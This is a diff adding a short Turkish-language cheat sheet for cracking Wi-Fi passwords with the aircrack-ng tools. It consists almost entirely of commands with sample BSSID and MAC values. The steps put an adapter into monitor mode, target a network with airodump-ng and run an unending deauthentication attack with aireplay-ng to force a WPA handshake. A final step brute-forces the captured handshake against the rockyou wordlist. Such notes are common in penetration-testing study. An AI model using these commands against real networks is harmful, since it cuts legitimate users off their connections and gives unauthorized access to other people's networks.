@@ -1,0 +1,48 @@
+1.Ağ Adaptörünü Kontrol ve Tanımlama
+
+	-lsusb
+	-iwconfig
+
+
+2. Monitor Moda Geçiş
+
+	-sudo ip link set wlan1 down
+	-sudo iwconfig wlan1 mode monitor
+	-sudo ip link set wlan1 up
+
+Veya Doğrudan;
+
+	-sudo airmon-ng start wlan1
+
+
+3. Ağları Tarama
+
+	-sudo airodump-ng wlan1mon
+
+Hedef belirlendikten sonra
+
+	-sudo airodump-ng -c [kanal_no] --bssid [hedef_BSSID] -w capture wlan1mon
+
+	Örnek;
+	-sudo airodump-ng -c 1 --bssid D6:21:F9:3A:72:52 -w capture wlan1mon
+
+
+4. Handshake Yakalama (Deauthentication Saldırısı)
+
+	-sudo aireplay-ng --deauth 0 -a [hedef_BSSID] -c [hedef_istasyon_MAC] wlan1mon
+
+	Örnek;
+	-sudo aireplay-ng --deauth 0 -a D6:21:F9:3A:72:52 -c 30:C8:36:4F:9C:60 wlan1mon
+
+
+5.Handshake Yakalanan .cap dosyası kontrol
+
+	-aircrack-ng capture-01.cap
+
+
+6. Handshake ile Şifre Kırma (Brute-force)
+
+	-aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [hedef_BSSID] capture-01.cap
+
+	Örnek;
+	-aircrack-ng -w /usr/share/wordlists/rockyou.txt -b D6:21:F9:3A:72:52 capture-01.cap
